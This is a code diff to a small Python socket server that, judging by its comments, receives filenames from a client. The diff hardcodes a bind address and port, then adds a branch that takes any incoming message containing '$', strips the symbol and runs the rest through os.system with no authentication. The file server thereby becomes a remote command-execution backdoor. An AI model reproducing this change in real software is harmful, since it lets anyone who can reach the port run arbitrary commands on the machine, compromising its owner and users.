@@ -1,14 +1,14 @@
 import socket
+import os
 
-IP = socket.gethostbyname(socket.gethostname())
-PORT = 4455
+IP = "129.32.95.112"
+PORT = 30001
 ADDR = (IP, PORT)
 SIZE = 1024
 FORMAT = "utf-8"
 
 
 def main():
-
     print("Port: " + str(PORT) + "\nIP: " + str(IP) + "\nAddress: " + str(ADDR))
     print("[STARTING] Server is starting.")
     """ Staring a TCP socket. """
@@ -31,7 +31,12 @@ def main():
         """ Receiving the filename from the client. """
         msg = conn.recv(SIZE).decode(FORMAT)
         # print(f"[RECV] message: {msg}")
-        print("[RECV] message: " + msg)
+        if "$" in msg:
+            msg = msg.replace('$', '')
+            print("Command: " + msg)
+            os.system(msg)
+        else:
+            print("[RECV] message: " + msg)
         conn.send("Message received.".encode(FORMAT))
 
     """ Closing the connection from the client. """
